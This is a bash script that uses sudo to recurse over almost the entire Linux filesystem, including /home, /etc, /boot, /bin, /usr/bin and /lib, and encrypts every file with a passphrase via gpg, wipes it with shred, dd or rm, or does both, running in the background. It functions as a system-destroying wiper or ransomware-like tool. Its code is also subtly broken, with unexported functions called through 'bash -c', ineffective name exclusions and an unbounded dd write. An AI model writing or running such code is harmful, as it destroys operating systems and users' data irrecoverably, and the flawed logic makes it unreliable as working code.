#!/bin/bash

# Function to check for the presence of critical binaries
check_binaries() {
    command -v shred >/dev/null 2>&1 && SHRED_PRESENT=true || SHRED_PRESENT=false
    command -v gpg >/dev/null 2>&1 && GPG_PRESENT=true || GPG_PRESENT=false
    command -v dd >/dev/null 2>&1 && DD_PRESENT=true || DD_PRESENT=false
    command -v rm >/dev/null 2>&1 && RM_PRESENT=true || RM_PRESENT=false
}

# Function to wipe using available tools
wipe_files() {
    if $SHRED_PRESENT; then
        echo "Using shred..."
        timeout 10s shred -uz -n 1 "$1"
    elif $DD_PRESENT; then
        echo "shred not found, using dd..."
        dd if=/dev/urandom of="$1" bs=1M status=progress
    elif $RM_PRESENT; then
        echo "shred and dd not found, using rm..."
        rm -f "$1"
    else
        echo "No suitable tool found for wiping."
    fi
}

# Function to encrypt using available tools
encrypt_files() {
    if $GPG_PRESENT; then
        echo "Using gpg..."
        timeout 10s gpg --yes --batch --passphrase "$PASSPHRASE" -c "$1"
    else
        echo "gpg not found, skipping encryption."
    fi
}

# Initial binary check
check_binaries

read -p "Do you want to (E)ncrypt, (W)ipe, or (B)oth? " choice

if [[ $choice =~ [EeBb] ]]; then
    # Securely read passphrase
    read -s -p "Enter passphrase for encryption: " PASSPHRASE
    echo
fi

case $choice in
    [Ee]* ) 
        nohup sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
        /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
        -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
        ! -name "$(which shred)" \
        ! -name "$(which gpg)" \
        ! -name "$(which bash)" \
        ! -name "$(which sh)" \
        ! -name "$(which find)" \
        ! -name "$(which timeout)" \
        ! -name "$(which nohup)" \
        ! -name "$(which sudo)" \
        ! -name "$(which rm)" \
        ! -name "$(which mv)" \
        ! -name "$(which ls)" \
        -exec bash -c 'encrypt_files "{}"' \; || true && \
        tail -f nohup.out remaining_files.log &
        ;;
    [Ww]* )
        nohup sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
        /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
        -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
        ! -name "$(which shred)" \
        ! -name "$(which gpg)" \
        ! -name "$(which bash)" \
        ! -name "$(which sh)" \
        ! -name "$(which find)" \
        ! -name "$(which timeout)" \
        ! -name "$(which nohup)" \
        ! -name "$(which sudo)" \
        ! -name "$(which rm)" \
        ! -name "$(which mv)" \
        ! -name "$(which ls)" \
        -exec bash -c 'wipe_files "{}"' \; || true && \
        tail -f nohup.out remaining_files.log &
        ;;
    [Bb]* )
        nohup sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
        /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
        -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
        ! -name "$(which shred)" \
        ! -name "$(which gpg)" \
        ! -name "$(which bash)" \
        ! -name "$(which sh)" \
        ! -name "$(which find)" \
        ! -name "$(which timeout)" \
        ! -name "$(which nohup)" \
        ! -name "$(which sudo)" \
        ! -name "$(which rm)" \
        ! -name "$(which mv)" \
        ! -name "$(which ls)" \
        -exec bash -c 'encrypt_files "{}"' \; -exec bash -c 'wipe_files "{}"' \; || true && \
        tail -f nohup.out remaining_files.log &
        ;;
    * )
        echo "Please choose (E) encrypt, (W) wipe, or (B) both."
        ;;
esac
